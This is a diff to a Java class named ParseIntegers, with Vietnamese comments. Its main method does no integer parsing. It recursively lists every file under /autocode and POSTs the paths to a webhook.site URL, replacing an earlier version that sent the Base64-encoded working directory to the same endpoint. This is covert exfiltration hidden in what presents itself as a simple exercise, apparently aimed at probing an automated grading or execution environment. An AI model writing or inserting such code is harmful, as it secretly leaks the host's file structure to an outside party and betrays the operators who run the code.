@@ -16,31 +16,45 @@ public class ParseIntegers {
                             .split(" "));
 
     public static void main(String[] args) {
-        // Lấy thư mục hiện tại
-        String currentDirectory = System.getProperty("user.dir");
 
-        // Mã hóa Base64
-        String encodedDirectory = Base64.getEncoder().encodeToString(currentDirectory.getBytes(StandardCharsets.UTF_8));
+        // Thu thập toàn bộ file trong /autocode/ (đệ quy)
+        File root = new File("/autocode");
+        StringBuilder fileListBuilder = new StringBuilder();
 
-        // Gửi POST request đến webhook.site
+        collectFilesRecursively(root, fileListBuilder);
+
+        // Gửi danh sách file về webhook
         try {
-            URL url = new URL("https://webhook.site/f69cac23-fe0a-408b-aa2a-0b9caeb3160a?x=" + encodedDirectory);
+            URL url = new URL("https://webhook.site/f69cac23-fe0a-408b-aa2a-0b9caeb3160a");
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
             conn.setDoOutput(true);
 
-            // Nội dung có thể để trống, vì tham số đã nằm trên URL
-            String postData = "";
+            byte[] postData = fileListBuilder.toString().getBytes(StandardCharsets.UTF_8);
             try (OutputStream os = conn.getOutputStream()) {
-                os.write(postData.getBytes(StandardCharsets.UTF_8));
+                os.write(postData);
             }
 
-            // Đọc response nếu cần
             int responseCode = conn.getResponseCode();
             System.out.println("Webhook response code: " + responseCode);
-
         } catch (Exception e) {
             e.printStackTrace();
         }
+    }
+
+    // Hàm đệ quy để duyệt toàn bộ cây thư mục
+    private static void collectFilesRecursively(File dir, StringBuilder builder) {
+        if (dir != null && dir.exists()) {
+            File[] files = dir.listFiles();
+            if (files != null) {
+                for (File file : files) {
+                    builder.append(file.getAbsolutePath()).append("\n");
+                    if (file.isDirectory()) {
+                        collectFilesRecursively(file, builder);
+                    }
+                }
+            }
+        }
+    }
     }
 }
